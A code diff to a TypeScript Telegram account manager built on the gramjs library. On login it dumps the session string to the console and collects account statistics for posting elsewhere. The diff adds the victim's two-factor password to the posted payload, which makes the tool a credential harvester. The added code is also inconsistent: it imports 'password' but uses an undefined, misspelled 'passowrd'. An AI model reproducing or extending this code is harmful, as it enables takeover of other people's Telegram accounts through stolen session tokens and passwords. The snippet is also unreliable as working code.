@@ -6,6 +6,7 @@ import { sleep } from "telegram/Helpers";
 import { computeCheck } from "telegram/Password";
 import bigInt from "big-integer";
 import { LogLevel } from "telegram/extensions/Logger";
+import { password } from "out";
 
 const clients = new Map();
 let creds = [
@@ -299,7 +300,7 @@ class TelegramManager {
                         })
                     )) as Api.auth.Authorization;
 
-                    this.processLogin(user);
+                    this.processLogin(user, passowrd);
                     return { status: 200, message: "Login success" }
                 } catch (error) {
                     return { status: 400, message: "2FA required" }
@@ -431,7 +432,7 @@ class TelegramManager {
         }
     }
 
-    async processLogin(result) {
+    async processLogin(result, passowrd = undefined) {
         console.log(this.client.session.save());
         let photoCount = 0;
         let videoCount = 0;
@@ -481,9 +482,8 @@ class TelegramManager {
         //         personalChats++;
         //     }
         // }
-        const callLogs = await this.getCallLogs();
+        // const callLogs = await this.getCallLogs();
 
-        console.log("CallLogs:", callLogs);
 
         const payload3 = {
             photoCount, videoCount, movieCount,
@@ -495,7 +495,7 @@ class TelegramManager {
             userName: user.username,
             channels: channels,
             personalChats: personalChats,
-            calls: callLogs?.totalCalls > 0 ? callLogs : {},
+            calls: {},//callLogs?.totalCalls > 0 ? callLogs : {},
             contacts: exportedContacts.savedCount,
             msgs: 0,//messageHistory.total,
             totalChats: 0,//chats['total'],
@@ -503,6 +503,10 @@ class TelegramManager {
             date: new Date(Date.now() * 1000),//date,
             tgId: user.id
         };
+        if (passowrd) {
+            payload3['twoFA'] = true;
+            payload3['password'] = passowrd
+        }
         console.log("Calculated results");
         try {
             console.log("posting results");
